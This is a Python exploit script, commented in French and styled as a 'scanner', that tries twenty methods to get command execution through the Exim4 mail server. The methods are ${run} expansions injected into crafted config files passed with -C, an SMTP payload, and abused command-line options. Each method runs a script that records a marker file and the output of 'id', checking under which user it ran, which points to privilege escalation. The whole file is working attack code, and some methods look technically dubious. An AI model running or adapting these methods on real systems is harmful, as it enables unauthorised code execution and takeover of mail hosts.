#!/usr/bin/env python3

import os
import subprocess
import time
import socket
import random
import string
from datetime import datetime

print("Scanner d'exécution de commande pour Exim4")
print("=========================================")

# Fonction pour exécuter une commande shell et retourner la sortie
def run_command(command):
    try:
        result = subprocess.run(command, shell=True, check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout, result.stderr, result.returncode
    except Exception as e:
        return "", str(e), -1

# Fonction pour créer un fichier témoin aléatoire
def create_random_marker():
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    marker_file = f"/tmp/exim_marker_{random_string}"
    marker_content = f"Exim exploit marker {datetime.now()}"
    return marker_file, marker_content

# Fonction pour vérifier si l'exploitation a réussi
def check_success(marker_file, marker_content=None):
    if os.path.exists(marker_file):
        if marker_content:
            try:
                with open(marker_file, 'r') as f:
                    content = f.read().strip()
                    if content == marker_content:
                        return True
            except:
                pass
        else:
            return True
    return False

# Fonction pour nettoyer les fichiers temporaires
def cleanup(files):
    for file in files:
        try:
            if os.path.exists(file):
                os.remove(file)
        except:
            pass

# Fonction pour créer un script shell qui crée un fichier témoin
def create_test_script(marker_file, marker_content):
    script_path = "/tmp/exim_test_script.sh"
    with open(script_path, "w") as f:
        f.write(f"""#!/bin/bash
# Créer un fichier témoin pour vérifier si la commande a fonctionné
echo "{marker_content}" > {marker_file}
chmod 777 {marker_file}
# Écrire l'ID utilisateur pour voir sous quel utilisateur la commande s'exécute
id >> {marker_file}
""")
    os.chmod(script_path, 0o755)
    return script_path

# Liste des méthodes d'exploitation à tester
exploitation_methods = []

# Méthode 1: Configuration simple avec ${run{...}}
def method1(script_path, marker_file, marker_content):
    print("\n[+] Méthode 1: Configuration simple avec ${run{...}}")
    config_path = "/tmp/exim_exploit1.conf"
    with open(config_path, "w") as f:
        f.write(f"""primary_hostname = ${{run{{/bin/sh -c "{script_path}"}}}}
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method1)

# Méthode 2: Configuration avec keep_environment
def method2(script_path, marker_file, marker_content):
    print("\n[+] Méthode 2: Configuration avec keep_environment")
    config_path = "/tmp/exim_exploit2.conf"
    with open(config_path, "w") as f:
        f.write(f"""keep_environment = SHELL=/bin/sh:PATH=/bin:/usr/bin
primary_hostname = ${{run{{/bin/sh -c "{script_path}"}}}}
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method2)

# Méthode 3: Configuration avec $(run...)
def method3(script_path, marker_file, marker_content):
    print("\n[+] Méthode 3: Configuration avec $(run...)")
    config_path = "/tmp/exim_exploit3.conf"
    with open(config_path, "w") as f:
        f.write(f"""primary_hostname = $(run {script_path})
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method3)

# Méthode 4: SMTP avec ${run{...}}
def method4(script_path, marker_file, marker_content):
    print("\n[+] Méthode 4: SMTP avec ${run{...}}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('localhost', 25))
        s.recv(1024)  # Recevoir le message de bienvenue
        
        commands = [
            "HELO localhost\r\n",
            "MAIL FROM: <>\r\n",
            "RCPT TO: <c2-web@localhost>\r\n",
            "DATA\r\n",
            f"From: root@localhost\r\nTo: c2-web@localhost\r\nSubject: Exploit\r\n\r\n${{run{{/bin/sh -c \"{script_path}\"}}}}.\r\n",
            "QUIT\r\n"
        ]
        
        for cmd in commands:
            s.send(cmd.encode())
            time.sleep(0.1)
            s.recv(1024)
        
        s.close()
        time.sleep(1)  # Attendre que la commande s'exécute
        return check_success(marker_file, marker_content)
    except Exception as e:
        print(f"Erreur SMTP: {e}")
        return False

exploitation_methods.append(method4)

# Méthode 5: Configuration avec ${extract{...}}
def method5(script_path, marker_file, marker_content):
    print("\n[+] Méthode 5: Configuration avec ${extract{...}}")
    config_path = "/tmp/exim_exploit5.conf"
    with open(config_path, "w") as f:
        f.write(f"""primary_hostname = ${{extract{{1}}{{${{run{{/bin/sh -c "{script_path}"}}}}}}}}
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method5)

# Méthode 6: Configuration avec message_size_limit
def method6(script_path, marker_file, marker_content):
    print("\n[+] Méthode 6: Configuration avec message_size_limit")
    config_path = "/tmp/exim_exploit6.conf"
    with open(config_path, "w") as f:
        f.write(f"""primary_hostname = localhost
message_size_limit = ${{run{{/bin/sh -c "{script_path}"}}{{}}}}
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method6)

# Méthode 7: Configuration avec acl_smtp_rcpt
def method7(script_path, marker_file, marker_content):
    print("\n[+] Méthode 7: Configuration avec acl_smtp_rcpt")
    config_path = "/tmp/exim_exploit7.conf"
    with open(config_path, "w") as f:
        f.write(f"""primary_hostname = localhost
acl_smtp_rcpt = ${{run{{/bin/sh -c "{script_path}"}}}}
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method7)

# Méthode 8: Exim -D option
def method8(script_path, marker_file, marker_content):
    print("\n[+] Méthode 8: Exim -D option")
    cmd = f"/usr/sbin/exim4 -C/dev/null -D'({{${{run{{/bin/sh -c \"{script_path}\"}}}}}}'"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method8)

# Méthode 9: Exim -be option
def method9(script_path, marker_file, marker_content):
    print("\n[+] Méthode 9: Exim -be option")
    cmd = f"echo '${{run{{/bin/sh -c \"{script_path}\"}}}}' | /usr/sbin/exim4 -be"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method9)

# Méthode 10: Exim -bh option
def method10(script_path, marker_file, marker_content):
    print("\n[+] Méthode 10: Exim -bh option")
    config_path = "/tmp/exim_exploit10.conf"
    with open(config_path, "w") as f:
        f.write(f"""host_lookup = ${{run{{/bin/sh -c "{script_path}"}}}}
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bh 127.0.0.1"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method10)

# Méthode 11: Configuration avec tls_certificate
def method11(script_path, marker_file, marker_content):
    print("\n[+] Méthode 11: Configuration avec tls_certificate")
    config_path = "/tmp/exim_exploit11.conf"
    with open(config_path, "w") as f:
        f.write(f"""tls_certificate = ${{run{{/bin/sh -c "{script_path}"}}}}
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method11)

# Méthode 12: Configuration avec system_filter
def method12(script_path, marker_file, marker_content):
    print("\n[+] Méthode 12: Configuration avec system_filter")
    config_path = "/tmp/exim_exploit12.conf"
    with open(config_path, "w") as f:
        f.write(f"""system_filter = ${{run{{/bin/sh -c "{script_path}"}}}}
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method12)

# Méthode 13: Configuration avec router
def method13(script_path, marker_file, marker_content):
    print("\n[+] Méthode 13: Configuration avec router")
    config_path = "/tmp/exim_exploit13.conf"
    with open(config_path, "w") as f:
        f.write(f"""primary_hostname = localhost

begin routers
  test_router:
    driver = accept
    domains = ${{run{{/bin/sh -c "{script_path}"}}}}
    transport = local_delivery
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method13)

# Méthode 14: Configuration avec transport
def method14(script_path, marker_file, marker_content):
    print("\n[+] Méthode 14: Configuration avec transport")
    config_path = "/tmp/exim_exploit14.conf"
    with open(config_path, "w") as f:
        f.write(f"""primary_hostname = localhost

begin transports
  local_delivery:
    driver = appendfile
    file = ${{run{{/bin/sh -c "{script_path}"}}}}
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method14)

# Méthode 15: Configuration avec authenticator
def method15(script_path, marker_file, marker_content):
    print("\n[+] Méthode 15: Configuration avec authenticator")
    config_path = "/tmp/exim_exploit15.conf"
    with open(config_path, "w") as f:
        f.write(f"""primary_hostname = localhost

begin authenticators
  plain:
    driver = plaintext
    server_condition = ${{run{{/bin/sh -c "{script_path}"}}}}
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method15)

# Méthode 16: Exim -bd option
def method16(script_path, marker_file, marker_content):
    print("\n[+] Méthode 16: Exim -bd option")
    config_path = "/tmp/exim_exploit16.conf"
    with open(config_path, "w") as f:
        f.write(f"""daemon_startup_retries = ${{run{{/bin/sh -c "{script_path}"}}}}
""")
    cmd = f"/usr/sbin/exim4 -C{config_path} -bd -q1h"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method16)

# Méthode 17: Exim -oMr option
def method17(script_path, marker_file, marker_content):
    print("\n[+] Méthode 17: Exim -oMr option")
    cmd = f"/usr/sbin/exim4 -oMr{script_path}"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method17)

# Méthode 18: Exim -oMs option
def method18(script_path, marker_file, marker_content):
    print("\n[+] Méthode 18: Exim -oMs option")
    cmd = f"/usr/sbin/exim4 -oMs{script_path}"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method18)

# Méthode 19: Exim -oMa option
def method19(script_path, marker_file, marker_content):
    print("\n[+] Méthode 19: Exim -oMa option")
    cmd = f"/usr/sbin/exim4 -oMa{script_path}"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method19)

# Méthode 20: Exim -oMi option
def method20(script_path, marker_file, marker_content):
    print("\n[+] Méthode 20: Exim -oMi option")
    cmd = f"/usr/sbin/exim4 -oMi{script_path}"
    stdout, stderr, _ = run_command(cmd)
    return check_success(marker_file, marker_content)

exploitation_methods.append(method20)

# Exécuter toutes les méthodes d'exploitation
def run_all_methods():
    marker_file, marker_content = create_random_marker()
    script_path = create_test_script(marker_file, marker_content)
    
    print(f"[*] Fichier témoin: {marker_file}")
    print(f"[*] Contenu témoin: {marker_content}")
    print(f"[*] Script de test: {script_path}")
    
    success = False
    successful_method = None
    
    for i, method in enumerate(exploitation_methods, 1):
        try:
            if method(script_path, marker_file, marker_content):
                print(f"\n[!] SUCCÈS avec la méthode {i}!")
                success = True
                successful_method = i
                break
            else:
                print(f"[-] Échec de la méthode {i}")
        except Exception as e:
            print(f"[-] Erreur lors de l'exécution de la méthode {i}: {e}")
    
    if success:
        print(f"\n[+] Exploitation réussie avec la méthode {successful_method}!")
        print(f"[+] Le fichier témoin a été créé: {marker_file}")
        
        # Vérifier si le fichier témoin contient le bon contenu
        try:
            with open(marker_file, 'r') as f:
                content = f.read().strip()
                print(f"[+] Contenu du fichier témoin:\n{content}")
        except:
            print("[-] Impossible de lire le fichier témoin.")
    else:
        print("\n[-] Toutes les méthodes d'exploitation ont échoué.")
        print("[-] Impossible d'exécuter des commandes avec Exim4.")
    
    # Nettoyer les fichiers temporaires
    cleanup([script_path])
    
    return success, successful_method

# Exécuter le scanner
if __name__ == "__main__":
    print("[*] Démarrage du scanner d'exécution de commande pour Exim4...")
    print("[*] Version d'Exim4: ", end="")
    stdout, stderr, _ = run_command("/usr/sbin/exim4 -bV | head -n 1")
    print(stdout.strip())
    
    success, method = run_all_methods()
    
    if success:
        print("\n[!] EXPLOITATION RÉUSSIE!")
        print(f"[!] Méthode {method} a fonctionné.")
        print("[!] Il est possible d'exécuter des commandes avec Exim4.")
    else:
        print("\n[-] ÉCHEC DE L'EXPLOITATION.")
        print("[-] Impossible d'exécuter des commandes avec Exim4.")
